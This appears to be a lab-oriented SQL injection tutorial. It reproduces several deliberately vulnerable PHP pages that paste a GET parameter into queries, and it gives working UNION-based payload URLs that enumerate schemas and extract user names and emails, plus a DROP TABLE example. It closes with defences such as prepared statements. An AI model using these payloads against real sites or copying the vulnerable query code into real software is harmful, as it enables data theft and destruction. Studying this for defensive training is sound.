# 🔐 SQL Injection Tutorial

## Error-Based String Injection Techniques

---

## 📋 Table of Contents

- [Overview](https://claude.ai/chat/759d1068-6f14-41a0-a954-c6cf84ebdbbf#overview)
- [Error-Based String 2](https://claude.ai/chat/759d1068-6f14-41a0-a954-c6cf84ebdbbf#error-based-string-2)
- [Error-Based String 3](https://claude.ai/chat/759d1068-6f14-41a0-a954-c6cf84ebdbbf#error-based-string-3)
- [Error-Based String 4](https://claude.ai/chat/759d1068-6f14-41a0-a954-c6cf84ebdbbf#error-based-string-4)
- [Error-Based String 5](https://claude.ai/chat/759d1068-6f14-41a0-a954-c6cf84ebdbbf#error-based-string-5)
- [Key Techniques](https://claude.ai/chat/759d1068-6f14-41a0-a954-c6cf84ebdbbf#key-techniques)
- [Defense Mechanisms](https://claude.ai/chat/759d1068-6f14-41a0-a954-c6cf84ebdbbf#defense-mechanisms)

---

## 🎯 Overview

This tutorial demonstrates various SQL injection techniques focusing on error-based string manipulation. These examples are from web application penetration testing exercises.

**⚠️ Warning**: These techniques should only be used for authorized security testing and educational purposes.

---

## 📌 Error-Based String 2

### Vulnerability Details

- **File**: `error-based-string2.php`
- **Parameter**: `id` (without quotes in SQL query)
- **Injection Point**: GET request

### 💻 Vulnerable PHP Code

```php
<?php

// Include the database connection file
include("connection.php");

?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Error Based String - Without quote</title>
</head>
<body>

<div style="margin-top:70px; color:#FFF; font-size:23px; text-align:center;">
    <h1><span class="style4">Error based string</span></h1>
    <font size="3" color="#66b060">
        <?php
        // Check if 'id' parameter is set via GET request
        if (isset($_GET['id'])) {
            // Get the 'id' parameter value
            $id = $_GET['id'];
            
            // Construct the SQL query using the 'id' parameter without quotes
            $query = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
            
            // Display the constructed query for debugging/error-based SQL injection
            // echo $query . "<br>";
            
            // Execute the query on the database
            $result = mysqli_query($connection, $query);
            
            // If query execution fails, output database error and terminate script
            if (!$result) {
                die("Database Query Failed: " . print_r(mysqli_error($connection), true));
            }
            
            // Fetch the resulting row (if any) and display user ID and name
            while ($row = mysqli_fetch_assoc($result)) {
                echo '<font color="#0000ff">';
                echo 'Your ID: - ' . $row['id'] . '<br>';
                echo 'Your User Name: - ' . $row['name'];
                echo '</font>';
            }
        }
        ?>
    </font>
</div>

</body>
</html>
```

### 🔍 Attack Methodology

#### 1. No Need to "Barrack" the Query

The original note says no need to "barrack" the query—likely meaning no need to quote or escape the `id` parameter since the vulnerable query uses it without quotes, e.g., `id=7`.

#### 2. Join the Query Using %23 (#)

Appending `%23` (URL-encoded `#` symbol) comments out the rest of the query.

**Examples:**

```
http://192.168.1.31/web-pentest/error-based-string2.php?id=7%23

http://192.168.1.31/web-pentest/error-based-string2.php?id=7 --+

http://192.168.1.31/web-pentest/error-based-string2.php?id=7 #
```

> 💡 The `%23` turns everything after it into a comment.

#### 3. Find Column Count Using ORDER BY

Test for the number of columns by incrementally increasing the ORDER BY value until you get an error.

**Examples:**

```
http://192.168.1.31/web-pentest/error-based-string2.php?id=7 order by 1 --+
http://192.168.1.31/web-pentest/error-based-string2.php?id=7 order by 7 #
http://192.168.1.31/web-pentest/error-based-string2.php?id=7 order by 8 %23
```

> 🔎 If the last query generates an error, the number just before the error is the number of columns.

#### 4. Run Multiple SELECT Statements Using UNION ALL

Once the number of columns is known, use UNION ALL to retrieve data from the database.

**Examples:**

**Simple numbered columns to check output:**

```
http://192.168.1.31/web-pentest/error-based-string2.php?id=-1 union all select 1,2,3,4,5,6,7%23
```

**Retrieve database name and current user:**

```
http://192.168.1.31/web-pentest/error-based-string2.php?id=-1 union all select database(),2,3,4,5,6,7%23
http://192.168.1.31/web-pentest/error-based-string2.php?id=-1 union all select database(),current_user,3,4,5,6,7%23
```

**List database names from the server:**

```
http://192.168.1.31/web-pentest/error-based-string2.php?id=-1 union all select table_schema,2,3,4,5 from information_schema.tables GROUP BY table_schema%23
```

**List table names in current database:**

```
http://192.168.1.31/web-pentest/error-based-string2.php?id=-1 union all select table_name,2,3,4,5 from information_schema.tables where table_schema=database()%23
```

**List tables from specific database (e.g., "dvwa"):**

```
http://192.168.1.31/web-pentest/error-based-string2.php?id=-1 union all select table_name,2,3,4,5 from information_schema.tables where table_schema='dvwa'%23
```

**Get all column names from a specific table (e.g., "users"):**

```
http://192.168.1.31/web-pentest/error-based-string2.php?id=-1 union all select group_concat(column_name),2,3,4,5 from information_schema.columns where table_name='users' AND table_schema=database()%23
```

**Get all data for specific columns from table "users":**

```
http://192.168.1.31/web-pentest/error-based-string2.php?id=-1 union all select group_concat(name),group_concat(email),3,4,5 from users%23
```

### 📝 Summary

- `%23` = `#` to comment out trailing SQL
- `ORDER BY` helps find the number of columns
- `UNION ALL SELECT` with proper column count used to fetch data

---

## 📌 Error-Based String 3

### Vulnerability Details

- **File**: `error-based-string3.php`
- **Parameter**: `id` (provided in the URL)
- **Injection Type**: Single quote string injection

### 💻 Vulnerable PHP Code

```php
<?php

// Include the database connection settings
include("connection.php");

?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Error Based String - Without quote</title>
</head>
<body>

<div style="margin-top:70px; color:#FFF; font-size:23px; text-align:center;">
    <h1><span class="style4">Error based string</span></h1>
    <font size="3" color="#66b060">
        <?php
        // Check if 'id' parameter is provided in the URL
        if (isset($_GET['id'])) {
            // Get the 'id' value from GET request
            $id = $_GET['id'];
            
            // Construct SQL query placing the id inside single quotes
            $query = "SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
            
            // Display the query for debugging / error-based SQL injection
            // echo $query . "<br>";
            
            // Execute the query on the database connection
            $result = mysqli_query($connection, $query);
            
            // If query fails, print database error and abort script
            if (!$result) {
                die("Database Query Failed: " . print_r(mysqli_error($connection), true));
            }
            
            // Fetch and display user data if available
            while ($row = mysqli_fetch_assoc($result)) {
                echo '<font color="#0000ff">';
                echo 'Your ID: - ' . $row['id'] . '<br>';
                echo 'Your User Name: - ' . $row['name'];
                echo '</font>';
            }
        }
        ?>
    </font>
</div>

</body>
</html>
```

### 🔍 SQL Queries (Barrack) and Join

#### Ways to Comment Out SQL Queries (Barrack)

1. **`--` (Double hyphen)**: Comments out everything after it on the same line. Must be followed by a space or control character.
    
    - Example: `SELECT * FROM users WHERE id=1--`
2. **`#` (Hash symbol)**: Comments out everything after it on the same line in MySQL.
    
    - Example: `SELECT * FROM users WHERE id=1#`
3. **`/* ... */` (C-style block comments)**: Comments out everything between `/*` and `*/`, which can span multiple lines.
    
    - Example: `SELECT * FROM users /* comment here */ WHERE id=1`
4. **Null byte `%00`**: In some DBMS or older versions (e.g., MS Access) to terminate strings or comments.
    

> ℹ️ These comment symbols are used to end or ignore the remaining part of the original valid SQL query when injecting malicious payloads.

#### Ways to Join Queries in SQLi

**UNION SELECT**: Combines results from multiple SELECT statements into a single result set, allowing attackers to extract data from other tables.

**Requirements for UNION:**

- Same number of columns in the original and injected query
- Compatible data types in corresponding columns

**Example:**

```sql
UNION SELECT 1, username, password FROM users--
```

**UNION ALL SELECT**: Same as UNION but returns all rows including duplicates, sometimes used to simplify or increase data retrieval.

**Multiple Statements Separated by Semicolon (;)**: Some DBMS allow multiple SQL statements to be executed sequentially in one query separated by `;`. This can be used to run additional malicious queries like `DROP TABLE`.

**Example:**

```sql
1; DROP TABLE users;--
```

---

## 📌 Error-Based String 4

### Vulnerability Details

- **File**: `error-based-string4.php`
- **Parameter**: `id` (inserted directly without quotes)

### 💻 Vulnerable PHP Code

```php
<?php

// Include the database connection file
include("connection.php");

?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Error Based String - Without quote</title>
</head>
<body>

<div style="margin-top:70px; color:#FFF; font-size:23px; text-align:center;">
    <h1><span class="style4">Error based string</span></h1>
    <font size="3" color="#66b060">
        <?php
        // Check if 'id' parameter is set in the URL
        if (isset($_GET['id'])) {
            // Get the 'id' parameter value directly from user input
            $id = $_GET['id'];
            
            // Construct SQL query with the 'id' parameter inside parentheses — no quotes around $id
            $query = "SELECT * FROM users WHERE id=($id) LIMIT 0,1";
            
            // Print the query for debugging / error-based SQL injection
            // echo $query . "<br>";
            
            // Execute the query on the database connection
            $result = mysqli_query($connection, $query);
            
            // If query execution fails, show the database error and stop execution
            if (!$result) {
                die("Database Query Failed: " . print_r(mysqli_error($connection), true));
            }
            
            // Fetch the resulting user row and display
            while ($row = mysqli_fetch_assoc($result)) {
                echo '<font color="#0000ff">';
                echo 'Your ID: - ' . $row['id'] . '<br>';
                echo 'Your User Name: - ' . $row['name'];
                echo '</font>';
            }
        }
        ?>
    </font>
</div>

</body>
</html>
```

### 🔍 Exploitation of the Payloads

The URLs demonstrate typical error-based SQL injection payloads used to exploit the vulnerability in `error-based-string4.php` where the `id` parameter is inserted directly without quotes.

#### 1. Commenting Out the Rest to Avoid Syntax Errors

**URL:**

```
http://192.168.1.31/web-pentest/error-based-string4.php?id=2) --+
```

**Explanation:**

- The `)` closes the opening parenthesis in the SQL statement
- The `--+` is a SQL comment that comments out the remainder of the SQL query, with the `+` representing a URL-encoded space

**Resulting SQL:**

```sql
SELECT * FROM users WHERE id=(2) -- <rest is ignored>
```

This payload effectively ends the original query early, useful for testing injection or bypassing.

#### 2. Union-Based Data Extraction

**URL:**

```
http://192.168.1.31/web-pentest/error-based-string4.php?id=2) union all select group_concat(name),group_concat(email),3,4,5,6,7 from users --+
```

**Explanation:**

- The `)` closes the parenthesis in the original query
- The `union all select` injects a new SELECT clause combining aggregated user names and emails
- The extra numbers (3,4,5,6,7) are filler values to match the expected number of columns
- The trailing `--+` comments out any trailing unwanted SQL to prevent syntax errors

**Resulting SQL Behavior:** Closes the quote, then performs a UNION ALL selecting concatenated names and emails from the users table, leveraging columns count (7) matching original query.

---

## 📌 Error-Based String 5

### Vulnerability Details

- **File**: `error-based-string5.php`
- **Parameter**: `id` (enclosed in double quotes and parentheses in SQL query)

### 💻 Vulnerable PHP Code

```php
<?php

// Include the database connection settings
include("connection.php");

?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Error Based String - Without quote</title>
</head>
<body>

<div style="margin-top:70px; color:#FFF; font-size:23px; text-align:center;">
    <h1><span class="style4">Error based string</span></h1>
    <font size="3" color="#66b060">
        <?php
        // Check if 'id' parameter is set in the GET request
        if (isset($_GET['id'])) {
            // Get the 'id' parameter (unsanitized user input)
            $id = $_GET['id'];
            
            // Wrap the id inside double quotes, note this is not standard SQL string quoting which uses single quotes.
            $id2 = '"' . $id . '"';
            
            // Construct the SQL query putting $id2 inside parentheses
            $query = "SELECT * FROM users WHERE id=($id2) LIMIT 0,1";
            
            // Output the query string for debugging / error-based SQL injection visibility
            // echo $query . "<br>";
            
            // Execute the query using the database connection
            $result = mysqli_query($connection, $query);
            
            // If execution fails, output detailed database error message and stop
            if (!$result) {
                die("Database Query Failed: " . print_r(mysqli_error($connection), true));
            }
            
            // Fetch and display user information from the result set
            while ($row = mysqli_fetch_assoc($result)) {
                echo '<font color="#0000ff">';
                echo 'Your ID: - ' . $row['id'] . '<br>';
                echo 'Your User Name: - ' . $row['name'];
                echo '</font>';
            }
        }
        ?>
    </font>
</div>

</body>
</html>
```

### 🔍 Key Observations

#### The input is wrapped in **double quotes** which is non-standard for SQL strings (which typically use single quotes).

**Behavior of double quotes in SQL** depends on the database system configuration. It may treat `"string"` as an identifier or string literal.

#### Because no input sanitization or escaping is done, this script is vulnerable to SQL injection attacks.

#### Attacker must craft injection payloads considering the double quotes and parentheses around the input.

---

### 🔍 Explanation of the URLs

The URLs reveal typical error-based SQL injection payloads designed for a vulnerable script `error-based-string5.php` where the `id` parameter is enclosed in double quotes and parentheses in the SQL query.

#### 1. **Normal Request**

**URL:**

```
http://192.168.1.31/web-pentest/error-based-string5.php.php?id=2
```

**Explanation:**

- Represents a normal request where `id=2`

**Query likely looks like:**

```sql
SELECT * FROM users WHERE id=("2") LIMIT 0,1
```

#### 2. **Commenting Out the Rest of the Query Safely**

**URL:**

```
http://192.168.1.31/web-pentest/error-based-string5.php.php?id=2") --+
```

**Payload Explanation:**

- The `")` closes the double quotes and the parentheses opened around `$id`
- The `--+` SQL comment syntax terminates the rest of the SQL query, with `+` representing a URL-encoded space

**This safely ends the query to avoid syntax errors, useful to test injection or bypass query restrictions.**

**Resulting SQL:**

```sql
SELECT * FROM users WHERE id=("2") -- <rest commented out>
```

#### 3. **Union-Based Data Extraction**

**URL:**

```
http://192.168.1.31/web-pentest/error-based-string5.php.php?id=2") union all select group_concat(name),group_concat(email),3,4,5,6,7 from users --+
```

**Payload Explanation:**

- The `")` closes the double quotes and the parentheses opened around `$id`
- The `union all select` injects a new SELECT clause combining aggregated user names and emails
- The extra numbers (3,4,5,6,7) are filler values to match the expected number of columns
- The trailing `--+` comments out any trailing unwanted SQL to prevent syntax errors

**Resulting SQL:**

```sql
SELECT * FROM users WHERE id=("2") 
UNION ALL SELECT group_concat(name), group_concat(email), 3, 4, 5, 6, 7 FROM users -- <rest commented out>
```

---

## 🛡️ Key Techniques

### Comment Techniques

- `--` (space required)
- `#` (hash symbol)
- `/**/` (C-style comments)
- `%00` (null byte in some DBMS)

### Data Extraction Methods

- `ORDER BY` - Column enumeration
- `UNION ALL SELECT` - Data exfiltration
- `group_concat()` - Combine multiple values
- `information_schema` - Database metadata

### Common Functions Used

- `database()` - Current database name
- `current_user` - Current user
- `table_schema` - Database names
- `table_name` - Table names
- `column_name` - Column names

---

## 🔒 Defense Mechanisms

### Best Practices

1. **Use Prepared Statements**
    
    ```php
    $stmt = $connection->prepare("SELECT * FROM users WHERE id = ?");
    $stmt->bind_param("i", $id);
    ```
    
2. **Input Validation**
    
    - Whitelist allowed characters
    - Type checking (integer, string, etc.)
    - Length validation
3. **Parameterized Queries**
    
    - Never concatenate user input directly
    - Use PDO or mysqli prepared statements
4. **Least Privilege Principle**
    
    - Database user should have minimal permissions
    - Read-only access where possible
5. **Error Handling**
    
    - Don't display detailed error messages to users
    - Log errors securely
6. **Web Application Firewall (WAF)**
    
    - Detect and block SQL injection attempts
    - Pattern matching for common attacks

---

## 📚 Additional Resources

- OWASP SQL Injection Prevention Cheat Sheet
- PortSwigger SQL Injection Guide
- HackTheBox & TryHackMe Labs

---

**📅 Last Updated**: January 2026

**⚖️ Legal Disclaimer**: This material is for educational purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before conducting security testing.

---

_Created for Web Application Penetration Testing Practice_